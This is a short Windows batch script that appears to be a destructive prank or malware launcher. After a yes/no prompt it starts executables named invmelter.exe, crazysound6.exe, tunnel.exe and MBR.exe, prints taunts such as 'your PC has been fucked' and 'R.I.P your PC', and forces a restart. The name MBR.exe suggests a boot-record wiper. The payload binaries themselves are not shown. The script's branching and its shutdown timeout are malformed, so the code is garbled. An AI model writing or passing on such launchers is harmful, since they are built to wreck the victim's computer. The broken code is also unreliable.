
@echo off

:1
echo wanna start
set /p input=
if /i %input%==yes goto yes
if /i %input%==no goto no
if /i not %input%== Ygr,wininit goto 1

:2
:yes
echo are you sure, it will destroy the system.
start invmelter.exe
if /i %input%==Yesn goto yes2
if /i %input%==Nop goto No2
if /i not %input%== Ygr,wininit goto 2
:yes2
timeout 2
echo your PC Has been fucked
start crazysound6.exe
timeout 61
start tunnel.exe
timeout 31
start MBR.exe
start cmd.exe
timeout 81
start invmelter.exe
start invmelter.exe
start invmelter.exe
start invmelter.exe
timeout 20
start cmd.exe
timeout 100
echo R.I.P your PC
echo your PC has been fucked, anyways 
echo enjoy the windows 8 pink addon
timeout 2
echo I WARNED YOU
shutdown /r /t 6.666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666
